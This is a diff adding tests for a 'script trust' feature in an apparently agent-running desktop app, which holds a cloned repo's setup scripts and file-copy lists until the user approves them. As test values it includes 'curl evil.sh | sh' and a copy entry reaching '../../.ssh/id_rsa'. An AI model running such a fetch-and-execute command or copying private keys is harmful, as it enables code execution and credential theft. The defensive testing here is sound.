@@ -6,7 +6,9 @@ import { Kernel } from '../src/main/kernel'
 import { installHooks, uninstallHooks, withKernelHooks } from '../src/main/services/hooksInstaller'
 import { discoverSkills } from '../src/main/services/files'
 import { discoverMcp, saveLinearToken, storedLinearToken } from '../src/main/services/integrations'
-import { loadRepoSettings, saveRepoSettings } from '../src/main/services/settings'
+import { loadRepoSettings, saveRepoSettings, scriptsToTrust, ScriptTrustStore, trustHash } from '../src/main/services/settings'
+import { bus } from '../src/main/bus'
+import type { PushEvent } from '../src/shared/ipc'
 import { bashVerdict, type SessionDeps } from '../src/main/services/sessions'
 import { tempRepo } from './helpers'
 
@@ -214,4 +216,142 @@ describe('skills for a room', () => {
     expect((await h['skills.list']({ roomId: room.id })).find((s) => s.name === 'plan')?.enabled).toBe(false)
     await k.stop()
   })
+})
+
+describe("trusting a room's scripts (KERNEL-209)", () => {
+  it('hashes the merged scripts and copy list, and has nothing to trust without them', async () => {
+    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
+    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()
+    // A copy list equal to Kernel's own default needs no trusting either.
+    await saveRepoSettings(repo, { files: { copy: ['.env', '.env.local'] } }, true)
+    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()
+
+    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install', run: 'pnpm dev' } }, true)
+    const shared = scriptsToTrust(await loadRepoSettings(repo))!
+    expect(shared).toEqual({ scripts: { setup: 'pnpm install', run: 'pnpm dev' }, copy: ['.env', '.env.local'] })
+    expect(trustHash(shared)).toMatch(/^[0-9a-f]{64}$/)
+    expect(trustHash(scriptsToTrust(await loadRepoSettings(repo))!)).toBe(trustHash(shared))
+
+    // The personal file overrides the shared one, and the hash follows what the room would run.
+    await saveRepoSettings(repo, { scripts: { setup: 'curl evil.sh | sh' } })
+    const local = scriptsToTrust(await loadRepoSettings(repo))!
+    expect(local.scripts.setup).toBe('curl evil.sh | sh')
+    expect(trustHash(local)).not.toBe(trustHash(shared))
+    // So does the copy list on its own.
+    expect(trustHash({ ...shared, copy: ['../../.ssh/id_rsa'] })).not.toBe(trustHash(shared))
+    // Moving text from one script to another is a change too.
+    expect(trustHash({ scripts: { run: 'pnpm install' }, copy: [] })).not.toBe(trustHash({ scripts: { setup: 'pnpm install' }, copy: [] }))
+  })
+
+  it('keeps trusted hashes per room in the data folder, across restarts', async () => {
+    const file = join(await mkdtemp(join(tmpdir(), 'kernel-data-')), 'trust.json')
+    const a = new ScriptTrustStore(file)
+    expect(await a.has('r1', 'h1')).toBe(false)
+    await a.add('r1', 'h1')
+    await a.add('r2', 'h2')
+    const b = new ScriptTrustStore(file)
+    expect(await b.has('r1', 'h1')).toBe(true)
+    expect(await b.has('r2', 'h1')).toBe(false)
+    await b.forget('r1')
+    expect(await new ScriptTrustStore(file).has('r1', 'h1')).toBe(false)
+  })
+
+  async function kernelFor(repo: string, dataDir?: string) {
+    dataDir ??= await mkdtemp(join(tmpdir(), 'kernel-data-'))
+    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
+    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: 18000 + Math.floor(Math.random() * 900), worktreeRoot: join(home, 'wt'), workspace: { baseRef: 'main' } }))
+    const k = new Kernel({ dataDir, home })
+    await k.start()
+    const sent: string[] = [], released: string[] = []
+    k.sessions.send = async (_chatId, parts) => { sent.push(parts.map((p) => (p.type === 'text' ? p.text : '')).join('')); return { queued: false } }
+    k.sessions.release = (chatId) => { released.push(chatId) }
+    const room = await k.addRoom(repo)
+    return { k, room, dataDir, sent, released, h: k.handlers() }
+  }
+
+  const clonedRepo = () => tempRepo({
+    'README.md': '# client\n',
+    '.gitignore': '.env.local\nran.txt\n',
+    '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
+    '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
+    '.kernel/settings.toml': '[scripts]\nsetup = "echo ran > ran.txt"\n\n[files]\ncopy = [".env.local"]\n'
+  })
+
+  it("holds a cloned repo's workspace until the room is trusted, then sets it up and sends the brief", async () => {
+    const repo = await clonedRepo()
+    await writeFile(join(repo, '.env.local'), 'SECRET=1\n')
+    const { k, room, sent, released, h } = await kernelFor(repo)
+    const pushed: PushEvent[] = []
+    const on = (e: PushEvent) => { if (e.type === 'room.trust' && e.roomId === room.id) pushed.push(e) }
+    bus.on('push', on)
+
+    const ws = await k.createWorkspace(room.id, { prompt: 'Build the table', agentId: 'kai', title: 'Invoice table' })
+    expect(ws.status).toBe('trust')
+    // Nothing ran and nothing was copied.
+    await expect(stat(join(ws.path, 'ran.txt'))).rejects.toThrow()
+    await expect(stat(join(ws.path, '.env.local'))).rejects.toThrow()
+    expect(sent).toEqual([])
+    const chat = k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
+    expect(k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])
+
+    const trust = await h['rooms.scriptTrust']({ roomId: room.id })
+    expect(trust).toMatchObject({ roomId: room.id, scripts: { setup: 'echo ran > ran.txt' }, copy: ['.env.local'], workspaceIds: [ws.id] })
+    expect(pushed.at(-1)).toEqual({ type: 'room.trust', roomId: room.id, trust })
+
+    await expect(h['rooms.trust']({ roomId: room.id, hash: 'not-the-hash' })).rejects.toThrow('changed since you read them')
+    expect(k.store.workspace(ws.id)?.status).toBe('trust')
+
+    await h['rooms.trust']({ roomId: room.id, hash: trust!.hash })
+    expect(pushed.at(-1)).toEqual({ type: 'room.trust', roomId: room.id, trust: null })
+    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
+    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('ran\n')
+    expect(await readFile(join(ws.path, '.env.local'), 'utf8')).toBe('SECRET=1\n')
+    expect(released).toEqual([chat.id])
+    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
+
+    // Unchanged text never asks twice.
+    const next = await k.createWorkspace(room.id, { prompt: 'Next', agentId: 'kai', title: 'Next' })
+    expect(next.status).toBe('ready')
+    expect(sent).toEqual(['Next'])
+    bus.off('push', on)
+    await k.stop()
+  }, 60000)
+
+  it('asks again when the text changes, and remembers trusted text after a restart', async () => {
+    const repo = await clonedRepo()
+    const first = await kernelFor(repo)
+    const trust = (await first.h['rooms.scriptTrust']({ roomId: first.room.id }))!
+    await first.h['rooms.trust']({ roomId: first.room.id, hash: trust.hash })
+    await first.k.stop()
+
+    const again = await kernelFor(repo, first.dataDir)
+    expect(again.room.id).toBe(first.room.id)
+    expect((await again.k.createWorkspace(again.room.id, { prompt: 'One', agentId: 'kai', title: 'One' })).status).toBe('ready')
+
+    // A pull changes the script: the next workspace waits again, and so does Run on the room's scripts.
+    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo changed > ran.txt"\n')
+    const held = await again.k.createWorkspace(again.room.id, { prompt: 'Two', agentId: 'kai', title: 'Two' })
+    expect(held.status).toBe('trust')
+    await expect(stat(join(held.path, 'ran.txt'))).rejects.toThrow()
+    const changed = (await again.h['rooms.scriptTrust']({ roomId: again.room.id }))!
+    expect(changed.hash).not.toBe(trust.hash)
+    expect(changed.scripts.setup).toBe('echo changed > ran.txt')
+    await expect(again.h['scripts.run']({ workspaceId: held.id, kind: 'setup' })).rejects.toThrow('Trust this room')
+    await again.k.stop()
+  }, 60000)
+
+  it('counts scripts saved in Settings, Scripts as trusted, and nothing else saved there', async () => {
+    const repo = await clonedRepo()
+    const { k, room, h } = await kernelFor(repo)
+    // Another room setting doesn't trust the scripts the repo brought.
+    await h['settings.setRoom']({ roomId: room.id, patch: { linear: { team: 'KERNEL' } } })
+    expect(await h['rooms.scriptTrust']({ roomId: room.id })).not.toBeNull()
+
+    await h['settings.setRoom']({ roomId: room.id, patch: { scripts: { setup: 'echo mine > ran.txt' } } })
+    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
+    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
+    expect(ws.status).toBe('ready')
+    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')
+    await k.stop()
+  }, 60000)
 })
